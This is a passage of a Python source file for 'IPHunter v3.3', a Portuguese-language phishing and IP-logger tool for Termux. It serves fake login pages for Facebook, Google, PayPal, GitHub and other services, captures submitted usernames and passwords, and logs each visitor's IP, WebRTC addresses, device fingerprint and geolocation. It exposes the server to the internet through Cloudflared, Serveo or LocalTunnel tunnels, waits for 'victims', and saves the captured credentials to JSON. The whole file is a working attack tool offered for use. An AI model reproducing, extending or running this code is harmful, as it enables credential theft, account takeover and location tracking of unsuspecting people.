                    'isp': data.get('org'),
                    'org': data.get('asn'),
                    'query': ip
                }
    except Exception as e:
        geo_data['error_ipapico'] = str(e)

    geo_data['status'] = 'fail'
    return geo_data

def format_geo_info(geo):
    """Formata as informacoes de geolocalizacao para exibicao"""
    if not geo or geo.get('status') != 'success':
        err = geo.get('error', '') or geo.get('error_ipapi', '') or geo.get('error_ipapico', 'Unknown error')
        return f"    {C.YELLOW}⚠ {err}{C.RESET}"

    lines = []
    fields = [
        ('🌍 Pais', 'country'),
        ('🏳 Codigo Pais', 'countryCode'),
        ('🌎 Continente', 'continent'),
        ('🏛 Cidade', 'city'),
        ('🏘 Distrito', 'district'),
        ('📍 Regiao', 'regionName'),
        ('📮 CEP', 'zip'),
        ('🌐 Timezone', 'timezone'),
        ('📡 ISP', 'isp'),
        ('🏢 Organizacao', 'org'),
        ('🔗 ASN', 'as'),
        ('📱 Movel', 'mobile'),
        ('🛡 Proxy/VPN', 'proxy'),
        ('📌 Latitude', 'lat'),
        ('📌 Longitude', 'lon'),
    ]

    for label, key in fields:
        val = geo.get(key)
        if val is not None and val != '':
            if key in ['lat', 'lon']:
                lines.append(f"    {C.YELLOW}{label}:{C.RESET} {C.BRIGHT_WHITE}{val}{C.RESET}")
            elif key == 'mobile' and val:
                lines.append(f"    {C.YELLOW}{label}:{C.RESET} {C.BRIGHT_WHITE}Sim{C.RESET}")
            elif key == 'proxy' and val:
                lines.append(f"    {C.BRIGHT_RED}{label}:{C.RESET} {C.BRIGHT_RED}SIM ⚠{C.RESET}")
            else:
                lines.append(f"    {C.YELLOW}{label}:{C.RESET} {C.BRIGHT_WHITE}{val}{C.RESET}")

    return '\n'.join(lines) if lines else f"    {C.DIM}Dados limitados disponiveis{C.RESET}"

# ============================================================
#  CLOUDFLARED - CORRIGIDO PARA TERMUX
# ============================================================
def start_cloudflared(port):
    """Inicia Cloudflared com retry e melhor tratamento de erro"""
    print_info("Verificando Cloudflared...")

    # Verificar se cloudflared existe
    cloudflared_path = None
    try:
        result = subprocess.run(['which', 'cloudflared'], capture_output=True, text=True)
        if result.returncode == 0:
            cloudflared_path = result.stdout.strip()
    except:
        pass

    # Verificar paths comuns no Termux
    if not cloudflared_path:
        for path in [
            f'{PREFIX}/bin/cloudflared',
            '/usr/local/bin/cloudflared',
            os.path.expanduser('~/.local/bin/cloudflared'),
            './cloudflared',
        ]:
            if os.path.exists(path) and os.access(path, os.X_OK):
                cloudflared_path = path
                break

    if not cloudflared_path:
        print_error("Cloudflared nao encontrado!")
        print_info("Instale com: pkg install cloudflared")
        print_info("Ou baixe: wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64")
        return None

    print_ok(f"Cloudflared encontrado: {cloudflared_path}")

    # Matar processos antigos
    os.system("pkill -f 'cloudflared tunnel' 2>/dev/null")
    time.sleep(2)

    # Usar diretorio temporario correto
    log_file = os.path.join(TMP_DIR, 'cloudflared_iphunter.log')
    os.system(f"rm -f {log_file}")

    # Iniciar cloudflared
    cmd = f"nohup {cloudflared_path} tunnel --url http://localhost:{port} --metrics localhost:45678 > {log_file} 2>&1 &"
    print_info("Iniciando tunel Cloudflared...")
    os.system(cmd)

    # Aguardar com retry
    print_info("Aguardando tunel (pode levar ate 15 segundos)...")

    for attempt in range(30):
        time.sleep(1)

        # Tentar ler do log
        try:
            with open(log_file, 'r') as fh:
                log = fh.read()

            # Procurar URL do cloudflared
            match = re.search(r'(https://[a-zA-Z0-9-]+\.trycloudflare\.com)', log)
            if match:
                url = match.group(1)
                print_ok(f"Tunel ativo: {url}")
                return url

            # Verificar erro no log
            if 'error' in log.lower() or 'failed' in log.lower():
                if attempt > 10:
                    break
        except:
            pass

        # Tentar API metrics
        if attempt > 5:
            try:
                req = urllib.request.Request('http://127.0.0.1:45678/metrics', timeout=2)
                with urllib.request.urlopen(req) as resp:
                    metrics = resp.read().decode()
                    match = re.search(r'(https://[a-zA-Z0-9-]+\.trycloudflare\.com)', metrics)
                    if match:
                        url = match.group(1)
                        print_ok(f"Tunel ativo (metrics): {url}")
                        return url
            except:
                pass

    # Falhou - mostrar log para debug
    print_error("Cloudflared nao conseguiu criar o tunel.")
    try:
        with open(log_file, 'r') as fh:
            log = fh.read()
        if log.strip():
            print_warn("Log do Cloudflared:")
            for line in log.split('\n')[-15:]:
                if line.strip():
                    print(f"    {C.DIM}{line}{C.RESET}")
        else:
            print_error("Log vazio. Cloudflared pode nao ter iniciado.")
            print_info("Tente rodar manualmente:")
            print(f"    {cloudflared_path} tunnel --url http://localhost:{port}")
    except Exception as e:
        print_error(f"Nao foi possivel ler o log: {e}")

    return None

# ============================================================
#  SERVEO
# ============================================================
def start_serveo(port):
    print_info("Iniciando Serveo (SSH tunnel)...")
    os.system("pkill -f 'serveo.net' 2>/dev/null")
    time.sleep(1)
    log_file = os.path.join(TMP_DIR, 'serveo.log')
    os.system(f"ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:{port} serveo.net > {log_file} 2>&1 &")
    time.sleep(6)
    for _ in range(15):
        try:
            with open(log_file, 'r') as fh:
                log = fh.read()
            match = re.search(r'(https?://[a-zA-Z0-9-]+\.serveo\.net)', log)
            if match:
                url = match.group(1)
                print_ok(f"Tunel ativo: {url}")
                return url
        except:
            pass
        time.sleep(1)
    print_error("Serveo nao respondeu.")
    return None

# ============================================================
#  LOCALTUNNEL
# ============================================================
def start_localtunnel(port):
    print_info("Iniciando LocalTunnel...")
    try:
        result = subprocess.run(['which', 'lt'], capture_output=True, text=True)
        if result.returncode != 0:
            print_error("LocalTunnel (lt) nao encontrado")
            print_info("Instale com: npm install -g localtunnel")
            return None
    except:
        return None
    os.system("pkill -f 'lt --port' 2>/dev/null")
    time.sleep(1)
    log_file = os.path.join(TMP_DIR, 'localtunnel.log')
    os.system(f"lt --port {port} > {log_file} 2>&1 &")
    time.sleep(5)
    for _ in range(15):
        try:
            with open(log_file, 'r') as fh:
                log = fh.read()
            match = re.search(r'(https?://[a-zA-Z0-9-]+\.loca\.lt)', log)
            if match:
                url = match.group(1)
                print_ok(f"Tunel ativo: {url}")
                return url
        except:
            pass
        time.sleep(1)
    print_error("LocalTunnel nao respondeu.")
    return None

# ============================================================
#  SERVIDOR HTTP COM IP LOGGER + GEOLOCALIZACAO
# ============================================================
class IPLoggerHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def do_GET(self):
        global captured_data, ip_logs, last_public_ip
        parsed = urlparse(self.path)
        path = parsed.path
        query = parse_qs(parsed.query)
        client_ip = self.client_address[0]
        user_agent = self.headers.get('User-Agent', 'Unknown')
        referer = self.headers.get('Referer', 'Direct')

        # Headers adicionais para fingerprinting
        accept = self.headers.get('Accept', 'Unknown')
        accept_lang = self.headers.get('Accept-Language', 'Unknown')
        accept_enc = self.headers.get('Accept-Encoding', 'Unknown')
        connection = self.headers.get('Connection', 'Unknown')
        dnt = self.headers.get('DNT', 'Unknown')
        upgrade = self.headers.get('Upgrade-Insecure-Requests', 'Unknown')
        sec_fetch = self.headers.get('Sec-Fetch-Site', 'Unknown')
        sec_mode = self.headers.get('Sec-Fetch-Mode', 'Unknown')
        sec_dest = self.headers.get('Sec-Fetch-Dest', 'Unknown')
        sec_ua = self.headers.get('Sec-CH-UA', 'Unknown')
        sec_plat = self.headers.get('Sec-CH-UA-Platform', 'Unknown')
        sec_mobile = self.headers.get('Sec-CH-UA-Mobile', 'Unknown')
        forwarded = self.headers.get('X-Forwarded-For', 'Unknown')
        real_ip = self.headers.get('X-Real-IP', 'Unknown')

        if path == '/log':
            # Coletar todos os dados do IP logger
            ip = query.get('ip', [client_ip])[0]
            webrtc_ips = query.get('webrtc_ips', [''])[0]
            ua = query.get('ua', [user_agent])[0]
            ref = query.get('ref', [referer])[0]
            lang = query.get('lang', ['Unknown'])[0]
            langs = query.get('langs', ['Unknown'])[0]
            plat = query.get('plat', ['Unknown'])[0]
            vendor = query.get('vendor', ['Unknown'])[0]
            screen_w = query.get('screen_w', ['Unknown'])[0]
            screen_h = query.get('screen_h', ['Unknown'])[0]
            screen_avail_w = query.get('screen_avail_w', ['Unknown'])[0]
            screen_avail_h = query.get('screen_avail_h', ['Unknown'])[0]
            screen_color = query.get('screen_color', ['Unknown'])[0]
            screen_pixel = query.get('screen_pixel', ['Unknown'])[0]
            screen_orient = query.get('screen_orient', ['Unknown'])[0]
            tz = query.get('tz', ['Unknown'])[0]
            tz_offset = query.get('tz_offset', ['Unknown'])[0]
            window_w = query.get('window_w', ['Unknown'])[0]
            window_h = query.get('window_h', ['Unknown'])[0]
            doc_w = query.get('doc_w', ['Unknown'])[0]
            doc_h = query.get('doc_h', ['Unknown'])[0]
            url_page = query.get('url', ['Unknown'])[0]
            host_page = query.get('host', ['Unknown'])[0]
            proto_conn = query.get('proto', ['Unknown'])[0]
            port_conn = query.get('port', ['Unknown'])[0]
            hw_cores = query.get('hw_cores', ['Unknown'])[0]
            device_mem = query.get('device_mem', ['Unknown'])[0]
            max_touch = query.get('max_touch', ['Unknown'])[0]
            online = query.get('online', ['Unknown'])[0]
            cookie = query.get('cookie', ['Unknown'])[0]
            dnt_flag = query.get('dnt', ['Unknown'])[0]
            pdf = query.get('pdf', ['Unknown'])[0]

            # Armazenar IP publico associado ao IP local para uso nas credenciais
            if ip and not ip.startswith(('192.168.', '10.', '127.', '::1')):
                last_public_ip[client_ip] = ip

            # GEOLOCALIZACAO DO SERVIDOR (mais confiavel)
            geo = get_ip_geolocation(ip)

            log_entry = {
                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'ip': ip,
                'client_ip': client_ip,
                'webrtc_ips': webrtc_ips,
                'user_agent': ua,
                'referer': ref,
                'language': lang,
                'languages': langs,
                'platform': plat,
                'vendor': vendor,
                'screen': f"{screen_w}x{screen_h}",
                'screen_avail': f"{screen_avail_w}x{screen_avail_h}",
                'screen_color': screen_color,
                'screen_pixel_ratio': screen_pixel,
                'screen_orientation': screen_orient,
                'timezone': tz,
                'timezone_offset': tz_offset,
                'window_size': f"{window_w}x{window_h}",
                'doc_size': f"{doc_w}x{doc_h}",
                'url': url_page,
                'host': host_page,
                'protocol': proto_conn,
                'port': port_conn,
                'hardware_cores': hw_cores,
                'device_memory': device_mem,
                'max_touch_points': max_touch,
                'online': online,
                'cookies_enabled': cookie,
                'do_not_track': dnt_flag,
                'pdf_viewer': pdf,
                'accept': accept,
                'accept_language': accept_lang,
                'accept_encoding': accept_enc,
                'connection_type': connection,
                'dnt_header': dnt,
                'upgrade_insecure': upgrade,
                'sec_fetch_site': sec_fetch,
                'sec_fetch_mode': sec_mode,
                'sec_fetch_dest': sec_dest,
                'sec_ch_ua': sec_ua,
                'sec_ch_ua_platform': sec_plat,
                'sec_ch_ua_mobile': sec_mobile,
                'x_forwarded_for': forwarded,
                'x_real_ip': real_ip,
                'geolocation': geo,
                'type': 'ip_logger'
            }
            ip_logs.append(log_entry)

            print()
            print(C.BRIGHT_GREEN + "═" * 70 + C.RESET)
            print(C.BRIGHT_GREEN + C.BOLD + "              🎯 NOVO ALVO CAPTURADO!" + C.RESET)
            print(C.BRIGHT_GREEN + "═" * 70 + C.RESET)
            print(f"    {C.YELLOW}📍 IP Publico:{C.RESET}     {C.BRIGHT_WHITE}{ip}{C.RESET}")
            if webrtc_ips:
                print(f"    {C.YELLOW}📡 IP Local (WebRTC):{C.RESET} {C.BRIGHT_WHITE}{webrtc_ips}{C.RESET}")
            print(f"    {C.YELLOW}🕐 Horario:{C.RESET}        {C.BRIGHT_WHITE}{log_entry['timestamp']}{C.RESET}")
            print(f"    {C.YELLOW}🖥 Tela:{C.RESET}          {C.BRIGHT_WHITE}{screen_w}x{screen_h} (DPR: {screen_pixel}){C.RESET}")
            print(f"    {C.YELLOW}📐 Janela:{C.RESET}        {C.BRIGHT_WHITE}{window_w}x{window_h}{C.RESET}")
            print(f"    {C.YELLOW}🌍 Timezone:{C.RESET}      {C.BRIGHT_WHITE}{tz} (Offset: {tz_offset}min){C.RESET}")
            print(f"    {C.YELLOW}🌐 User-Agent:{C.RESET}    {C.DIM}{ua[:70]}{C.RESET}")
            print(f"    {C.YELLOW}🔗 Referer:{C.RESET}       {C.DIM}{ref[:50]}{C.RESET}")
            print(f"    {C.YELLOW}🗣 Idiomas:{C.RESET}      {C.BRIGHT_WHITE}{langs}{C.RESET}")
            print(f"    {C.YELLOW}💻 Plataforma:{C.RESET}    {C.BRIGHT_WHITE}{plat} | Vendor: {vendor}{C.RESET}")
            print(f"    {C.YELLOW}⚙ Cores CPU:{C.RESET}    {C.BRIGHT_WHITE}{hw_cores}{C.RESET}")
            print(f"    {C.YELLOW}💾 Memoria:{C.RESET}      {C.BRIGHT_WHITE}{device_mem} GB{C.RESET}")
            print(f"    {C.YELLOW}👆 Touch:{C.RESET}        {C.BRIGHT_WHITE}{max_touch} pontos{C.RESET}")
            print(f"    {C.YELLOW}🍪 Cookies:{C.RESET}      {C.BRIGHT_WHITE}{cookie}{C.RESET}")
            print(f"    {C.YELLOW}🌐 Online:{C.RESET}       {C.BRIGHT_WHITE}{online}{C.RESET}")
            print(f"    {C.YELLOW}📄 PDF:{C.RESET}          {C.BRIGHT_WHITE}{pdf}{C.RESET}")
            print(f"    {C.YELLOW}🚫 DNT:{C.RESET}          {C.BRIGHT_WHITE}{dnt_flag}{C.RESET}")
            print(f"    {C.YELLOW}📍 URL:{C.RESET}          {C.BRIGHT_WHITE}{url_page}{C.RESET}")
            print()
            print(C.BRIGHT_CYAN + C.BOLD + "    📍 GEOLOCALIZACAO COMPLETA:" + C.RESET)
            geo_formatted = format_geo_info(geo)
            print(geo_formatted)
            print(C.BRIGHT_GREEN + "═" * 70 + C.RESET)
            print()

            self.send_response(200)
            self.send_header('Content-type', 'image/gif')
            self.end_headers()
            self.wfile.write(b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;')
            return

        if path in ['/', '/index.html']:
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            self.wfile.write(current_template.encode('utf-8'))
            return

        self.send_response(404)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b'<h1>404 Not Found</h1>')

    def do_POST(self):
        global captured_data, last_public_ip
        client_ip = self.client_address[0]
        user_agent = self.headers.get('User-Agent', 'Unknown')
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode('utf-8')
        form_data = parse_qs(post_data)

        # Usar IP publico se disponivel, senao usar client_ip
        geo_ip = last_public_ip.get(client_ip, client_ip)

        # GEOLOCALIZACAO
        geo = get_ip_geolocation(geo_ip)

        capture = {
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'ip': client_ip,
            'public_ip': geo_ip if geo_ip != client_ip else None,
            'user_agent': user_agent,
            'data': {k: v[0] if v else '' for k, v in form_data.items()},
            'geolocation': geo,
            'type': 'credentials'
        }
        captured_data.append(capture)

        print()
        print(C.BRIGHT_RED + "═" * 70 + C.RESET)
        print(C.BRIGHT_RED + C.BOLD + "              🔥 CREDENCIAIS CAPTURADAS!" + C.RESET)
        print(C.BRIGHT_RED + "═" * 70 + C.RESET)
        print(f"    {C.YELLOW}📍 IP Local:{C.RESET}      {C.BRIGHT_WHITE}{client_ip}{C.RESET}")
        if capture['public_ip']:
            print(f"    {C.YELLOW}🌐 IP Publico:{C.RESET}    {C.BRIGHT_WHITE}{capture['public_ip']}{C.RESET}")
        print(f"    {C.YELLOW}🕐 Horario:{C.RESET}     {C.BRIGHT_WHITE}{capture['timestamp']}{C.RESET}")
        for key, value in capture['data'].items():
            print(f"    {C.YELLOW}🔑 {key}:{C.RESET}      {C.BRIGHT_WHITE}{value}{C.RESET}")
        print()
        print(C.BRIGHT_CYAN + C.BOLD + "    📍 GEOLOCALIZACAO:" + C.RESET)
        geo_formatted = format_geo_info(geo)
        print(geo_formatted)
        print(C.BRIGHT_RED + "═" * 70 + C.RESET)
        print()

        self.send_response(302)
        self.send_header('Location', redirect_url)
        self.end_headers()

def start_server(port, template, redirect):
    global current_template, redirect_url, httpd, server_running
    current_template = template
    redirect_url = redirect
    handler = IPLoggerHandler
    try:
        httpd = socketserver.TCPServer(("", port), handler)
        server_running = True
        print_ok(f"Servidor iniciado na porta {port}")
        httpd.serve_forever()
    except OSError as e:
        print_error(f"Erro ao iniciar servidor: {e}")
        server_running = False

def stop_server():
    global httpd, server_running
    if httpd:
        httpd.shutdown()
        httpd.server_close()
        server_running = False
        print_ok("Servidor parado")

# ============================================================
#  MENU PRINCIPAL
# ============================================================
def show_banner():
    clear()
    print()
    print(C.BRIGHT_CYAN + BANNER + C.RESET)
    print(C.BRIGHT_CYAN + C.BOLD + "           IPHunter v3.3 - IP Logger & Phishing Tool" + C.RESET)
    print(C.DIM + "           Criado para Termux | Geolocalizacao Completa | Dados Reais" + C.RESET)
    print()

def show_menu():
    print_section("ESCOLHA O SITE")
    col1 = [
        ('01', 'IP Logger (Vazio)'),
        ('02', 'Facebook'),
        ('03', 'Instagram'),
        ('04', 'Google'),
        ('05', 'Netflix'),
        ('06', 'Microsoft'),
        ('07', 'Twitter/X'),
    ]
    col2 = [
        ('08', 'PayPal'),
        ('09', 'TikTok'),
        ('10', 'Spotify'),
        ('11', 'Discord'),
        ('12', 'Snapchat'),
        ('13', 'LinkedIn'),
        ('14', 'Twitch'),
    ]
    col3 = [
        ('15', 'Steam'),
        ('16', 'Pinterest'),
        ('17', 'Reddit'),
        ('18', 'GitHub'),
        ('19', 'WhatsApp'),
        ('20', 'Telegram'),
    ]
    max_rows = max(len(col1), len(col2), len(col3))
    for i in range(max_rows):
        parts = []
        if i < len(col1):
            num, name = col1[i]
            parts.append(f"{C.BRIGHT_RED}{C.BOLD}[{num}]{C.RESET} {C.WHITE}{name:<20}{C.RESET}")
        else:
            parts.append(" " * 28)
        if i < len(col2):
            num, name = col2[i]
            parts.append(f"{C.BRIGHT_BLUE}{C.BOLD}[{num}]{C.RESET} {C.WHITE}{name:<20}{C.RESET}")
        else:
            parts.append(" " * 28)
        if i < len(col3):
            num, name = col3[i]
            parts.append(f"{C.BRIGHT_GREEN}{C.BOLD}[{num}]{C.RESET} {C.WHITE}{name}{C.RESET}")
        else:
            parts.append("")
        line = "    " + "    ".join(parts)
        print(line)
    print()
    print(f"    {C.BRIGHT_YELLOW}{C.BOLD}[99]{C.RESET} {C.BRIGHT_RED}Sair{C.RESET}")
    print()
    print(f"    {C.CYAN}➤ Escolha uma opcao:{C.RESET}", end=" ")

def show_tunnel_menu():
    print_section("ESCOLHA O TUNEL")
    print(f"    {C.BRIGHT_BLUE}{C.BOLD}[1]{C.RESET} {C.WHITE}Cloudflared (Recomendado - Sem token){C.RESET}")
    print(f"    {C.BRIGHT_YELLOW}{C.BOLD}[2]{C.RESET} {C.WHITE}Serveo (SSH){C.RESET}")
    print(f"    {C.BRIGHT_MAGENTA}{C.BOLD}[3]{C.RESET} {C.WHITE}LocalTunnel{C.RESET}")
    print(f"    {C.BRIGHT_WHITE}{C.BOLD}[4]{C.RESET} {C.WHITE}Apenas Localhost (mesma rede WiFi){C.RESET}")
    print()
    print(f"    {C.CYAN}➤ Escolha:{C.RESET}", end=" ")

def show_results():
    print_section("RESULTADOS CAPTURADOS")
    print(f"    {C.BRIGHT_CYAN}{C.BOLD}📍 IPs CAPTURADOS ({len(ip_logs)}):{C.RESET}")
    if ip_logs:
        for i, log in enumerate(ip_logs[-10:], 1):
            geo_str = ""
            if log.get('geolocation') and log['geolocation'].get('status') == 'success':
                g = log['geolocation']
                geo_str = f" | {g.get('city','')}, {g.get('country','')}"
            print(f"    {C.YELLOW}[{i}]{C.RESET} {C.BRIGHT_WHITE}{log['ip']}{C.RESET} {C.DIM}(WebRTC: {log.get('webrtc_ips', 'N/A') or 'N/A'}){C.RESET}{C.BRIGHT_CYAN}{geo_str}{C.RESET} - {C.DIM}{log['timestamp']}{C.RESET}")
    else:
        print(f"    {C.DIM}Nenhum IP capturado ainda{C.RESET}")
    print()
    print(f"    {C.BRIGHT_RED}{C.BOLD}🔑 CREDENCIAIS CAPTURADAS ({len(captured_data)}):{C.RESET}")
    if captured_data:
        for i, cap in enumerate(captured_data[-10:], 1):
            geo_str = ""
            if cap.get('geolocation') and cap['geolocation'].get('status') == 'success':
                g = cap['geolocation']
                geo_str = f" | {g.get('city','')}, {g.get('country','')}"
            ip_display = cap.get('public_ip') or cap['ip']
            print(f"    {C.YELLOW}[{i}]{C.RESET} {C.BRIGHT_WHITE}{ip_display}{C.RESET}{C.BRIGHT_CYAN}{geo_str}{C.RESET} - {C.DIM}{cap['timestamp']}{C.RESET}")
            for k, v in cap['data'].items():
                print(f"         {C.YELLOW}{k}:{C.RESET} {C.BRIGHT_WHITE}{v}{C.RESET}")
    else:
        print(f"    {C.DIM}Nenhuma credencial capturada ainda{C.RESET}")
    print()

def save_results():
    if not captured_data and not ip_logs:
        print_error("Nenhum dado para salvar!")
        return
    filename = f"iphunter_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    data = {
        'timestamp': datetime.now().isoformat(),
        'ip_logs': ip_logs,
        'credentials': captured_data
    }
    try:
        with open(filename, 'w', encoding='utf-8') as fh:
            json.dump(data, fh, indent=2, ensure_ascii=False)
        print_ok(f"Resultados salvos em: {filename}")
    except Exception as e:
        print_error(f"Erro ao salvar: {e}")

# ============================================================
#  FUNCAO MAIN
# ============================================================
def main():
    global server_running, server_thread

    while True:
        show_banner()
        show_menu()

        try:
            choice = input().strip().lower()
        except (EOFError, KeyboardInterrupt):
            print()
            break

        if choice == '99':
            if server_running:
                stop_server()
            clear()
            print()
            print_header("Obrigado por usar o IPHunter v3.3!")
            print()
            break

        if choice not in SITES:
            print(f"\n    {C.RED}✗ Opcao invalida!{C.RESET}")
            time.sleep(1)
            continue

        site_name, template = SITES[choice]

        # Escolher tunel
        clear()
        show_banner()
        show_tunnel_menu()

        try:
            tunnel_choice = input().strip()
        except (EOFError, KeyboardInterrupt):
            continue

        # Escolher porta
        print()
        print(f"    {C.CYAN}➤ Digite a porta (padrao 8080):{C.RESET}", end=" ")
        try:
            port_input = input().strip()
            port = int(port_input) if port_input else 8080
        except:
            port = 8080

        # Escolher URL de redirecionamento
        print(f"    {C.CYAN}➤ URL de redirecionamento apos captura (padrao: google.com):{C.RESET}", end=" ")
        try:
            redirect = input().strip()
            if not redirect.startswith('http'):
                redirect = 'https://' + redirect if redirect else 'https://google.com'
        except:
            redirect = 'https://google.com'

        # Iniciar servidor
        clear()
        show_banner()
        print_header(f"INICIANDO: {site_name}")

        server_thread = threading.Thread(target=start_server, args=(port, template, redirect))
        server_thread.daemon = True
        server_thread.start()
        time.sleep(1)

        if not server_running:
            print_error("Falha ao iniciar servidor!")
            time.sleep(2)
            continue

        local_ip = get_local_ip()
        print_ok(f"Servidor local: http://{local_ip}:{port}")
        print()

        # Iniciar tunel
        public_url = None
        if tunnel_choice == '1':
            public_url = start_cloudflared(port)
        elif tunnel_choice == '2':
            public_url = start_serveo(port)
        elif tunnel_choice == '3':
            public_url = start_localtunnel(port)

        print()
        if public_url:
            print(C.BRIGHT_GREEN + "═" * 70 + C.RESET)
            print(C.BRIGHT_GREEN + C.BOLD + "              🌐 LINK PUBLICO:" + C.RESET)
            print()
            print(f"    {C.BRIGHT_WHITE}{C.BOLD}{public_url}{C.RESET}")
            print()
            print(C.BRIGHT_GREEN + "═" * 70 + C.RESET)
        else:
            print(C.YELLOW + "═" * 70 + C.RESET)
            print(C.YELLOW + "    ⚠ Nenhum tunel publico disponivel" + C.RESET)
            print(C.YELLOW + "    Use o link local acima (mesma rede WiFi)" + C.RESET)
            print(C.YELLOW + "═" * 70 + C.RESET)

        print()
        print(f"    {C.BRIGHT_CYAN}{C.BOLD}🎯 Aguardando vitimas...{C.RESET}")
        print(f"    {C.DIM}Pressione ENTER para parar o servidor e ver resultados{C.RESET}")
        print()

        try:
            input()
        except (EOFError, KeyboardInterrupt):
            pass

        stop_server()
        time.sleep(0.5)

        # Mostrar resultados
        clear()
        show_banner()
        show_results()

        print(f"    {C.CYAN}➤ Deseja salvar os resultados? (s/n):{C.RESET}", end=" ")
        try:
            save_choice = input().strip().lower()
            if save_choice == 's':
                save_results()
        except:
            pass

        print()
        print(f"    {C.CYAN}➤ Pressione ENTER para voltar ao menu...{C.RESET}")
        try:
            input()
        except:
            pass

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        if server_running:
            stop_server()
        clear()
        print()
        print_header("IPHunter v3.3 encerrado pelo usuario.")
        print()
    except Exception as e:
        clear()
        print()
        print_header(f"ERRO: {str(e)[:40]}")
        print()
